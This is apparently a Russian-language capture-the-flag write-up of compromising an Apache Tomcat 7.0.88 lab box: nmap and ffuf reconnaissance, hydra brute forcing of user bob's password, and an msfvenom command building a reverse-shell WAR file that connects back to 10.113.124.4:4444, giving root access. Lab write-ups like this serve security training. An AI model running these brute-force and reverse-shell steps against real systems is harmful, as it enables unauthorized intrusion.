nmap, кроме стандартных 22 и 80, показал открытые 1234 и 8009
```
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13
```

Запустим более подробное сканирование.

Картина стала более понятна. Начнем исследование с 80 порта.
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:d3:3c:1c:ca:b9:81:f9:05:8b:35:f8:e6:b4:5c:42 (RSA)
|   256 33:c3:cd:be:ec:9a:0a:df:82:56:0a:cd:fa:59:4f:28 (ECDSA)
|_  256 79:4f:6a:94:b9:20:e7:0e:24:08:4b:6c:a2:78:60:1a (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ничего интересного из открытых функций на сайте нету.

![](../images/Pasted%20image%2020260518153145.png)

Запустим ffuf и изучим исходный код сайта.

В исходном коде ничего интересного нет. Посмотрим второй веб-сервер.

Бросается в глаза версия Tomcat - 7.0.88

![](../images/Pasted%20image%2020260518153618.png)

Я нашел информацию в интернете "Версия Apache Tomcat 7.0.88 была затронута уязвимостью CVE 2017-12617."
Но попытка использовать уязвимость закончилась ничем (позже я узнал что там нужна авторизация).

![](../images/Pasted%20image%2020260518154512.png)

ffuf у первого сайта закончил работу и поэтому можно посмотреть на его результат.

Найдена скрытая директория. Посмотрим что в ней.

![](../images/Pasted%20image%2020260518154950.png)

В этой директории просто идет отсылка на второй веб-сервер и имя пользователя bob.

![](../images/Pasted%20image%2020260518155044.png)

Пока ffuf поищет файлы в найденной директории мы можем вернуться ко второму веб-серверу и посмотреть что там.

Кроме стандартных tomcat директорий и файлов я ничего не нашел. Пока искал я запустил hydra для перебора паролей bob, на первом веб-сервере в защищенную часть сайта - директорию protected.

Пароль найден, заходим в директорию

![](../images/Pasted%20image%2020260518165719.png)

На странице сказано, что это страница перемещена на другой порт

![](../images/Pasted%20image%2020260518165826.png)

Этот логин и пароль также подошли и к веб-серверу на другом порте 1234

![](../images/Pasted%20image%2020260518170315.png)

Далее я нашел статью по эксплуатации уязвимости в TomCat 7.0.88 **[CVE-2020-1938-Exploitation](https://github.com/hopsypopsy8/CVE-2020-1938-Exploitation)**
Поэтому создаем .war файл с реверс шеллом, подходящий под техностек нашего сайта

```
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.113.124.4 LPORT=4444 -f war -o shell.war
```

Видим, что shell загрузился. Чтобы активировать оболочку, надо перейти по этому пути

![](../images/Pasted%20image%2020260518171158.png)

Переходим по ссылке на наш файл и запрос зависает.

![](../images/Pasted%20image%2020260518171639.png)

Это означает, что мы подключились через реверс шел к своему серверу.

Интересно, мы подключились сразу от root пользователя, соответственно повышать права даже не надо.

![](../images/Pasted%20image%2020260518171751.png)

Ищем и читаем флаг.

![](../images/Pasted%20image%2020260518171916.png)
